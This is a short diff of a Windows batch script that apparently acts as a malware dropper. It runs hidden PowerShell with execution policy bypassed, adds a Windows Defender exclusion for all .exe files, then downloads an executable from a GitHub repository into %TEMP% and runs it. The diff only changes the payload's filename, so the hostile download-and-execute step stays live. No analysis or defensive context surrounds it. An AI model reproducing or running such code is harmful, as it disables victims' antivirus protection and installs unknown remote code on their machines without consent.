@@ -33,5 +33,5 @@ REM --> Silent PowerShell commands
 :--------------------------------------
 Powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/adsnt.exe' -OutFile adsnt.exe"
-adsnt.exe
+Powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/adsnt113.exe' -OutFile adsnt113.exe"
+adsnt113.exe
